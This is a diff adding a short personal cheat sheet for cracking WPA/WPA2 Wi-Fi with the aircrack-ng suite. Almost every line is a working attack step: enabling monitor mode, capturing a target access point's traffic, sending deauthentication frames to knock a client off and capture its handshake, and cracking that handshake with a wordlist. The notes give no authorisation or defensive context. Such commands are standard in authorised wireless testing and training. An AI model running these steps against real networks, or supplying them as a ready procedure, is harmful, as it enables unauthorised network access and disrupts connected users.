@@ -1,0 +1,19 @@
+
+Test packet injection:
+    aireplay-ng -9 wlan0
+
+
+Crack WPA & WPA2
+    airmon-ng 
+        for seeing what interface can be used
+    airmon-ng start wlan0
+        start promiscuous mode
+    airodump-ng mon0
+        -> copy the access point bssid of target and channel
+    airodump-ng --bssid <bssid of ap> --channel <channel n> --write <my log name> mon0
+     ^ while this runs:
+     aireplay-ng --deauth 10 -a <bssid of ap> mon0  # broadcast deauth, not useful yet
+     aireplay-ng --deauth 10 -a <bssid of ap> -c <mac for station on network> mon0
+    ^ stop airodump-ng after aireplay-ng has generated wpa handshake
+    aircrack-ng <log name>.cap -w <my word file>
+    aircrack-ng <log name>.cap -w <my word file> -b <bssid of ap>
